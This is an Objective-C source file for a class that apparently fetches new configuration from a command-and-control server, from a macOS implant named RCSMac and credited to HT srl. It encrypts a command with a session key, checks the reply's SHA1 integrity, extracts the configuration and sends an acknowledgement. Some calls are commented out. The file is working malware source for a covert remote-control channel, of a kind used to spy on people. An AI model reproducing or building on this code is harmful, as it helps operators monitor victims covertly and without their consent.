/*
 * RCSMac - ConfigurationUpdate Network Operation
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "ConfNetworkOperation.h"
#import "RCSICommon.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
//#import "RCSIInfoManager.h"

//#import "RCSITaskManager.h"
//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


@implementation ConfNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if ((self = [super init]))
    {
      mTransport = aTransport;
    
#ifdef DEBUG_CONF_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (BOOL)perform
{
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
                                                             
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  [commandData encryptWithKey: gSessionKey];
  
  // Send encrypted message
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
    id infoManager = nil;//[[_i_InfoManager alloc] init];

  if (replyData == nil)
    {
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif

  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
  
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {return NO;
    }
  
  if (command != PROTO_OK)
    {
      return NO;
    }
    
  uint32_t configSize = 0;
  
  @try
    {
      [replyDecrypted getBytes: &configSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
      //[infoManager logActionWithDescription: @"Corrupted configuration received"];
     
      return NO;
    }

  if (configSize == 0)
    {
      //[infoManager logActionWithDescription: @"Corrupted configuration received"];
    
      return NO;
    }
  
  NSMutableData *configData;
  
  @try
    {
      configData = [[NSMutableData alloc] initWithData:
                    [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
    }
  @catch (NSException *e)
    {
      //[infoManager logActionWithDescription: @"Corrupted configuration received"];
      return NO;
    }
  
//  if ([[_i_ConfManager sharedInstance] updateConfiguration: configData] == FALSE)
//    {
//      return NO;
//    }
  
  return YES;
}

- (BOOL)sendConfAck:(int)retAck
{
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
                                                             
  [commandData appendBytes: &retAck length:sizeof(int)];                                                          
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  [commandData encryptWithKey: gSessionKey];
  
  // Send encrypted message
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];

  if (replyData == nil)
    {
      return NO;
    }

  return YES;
}
@end
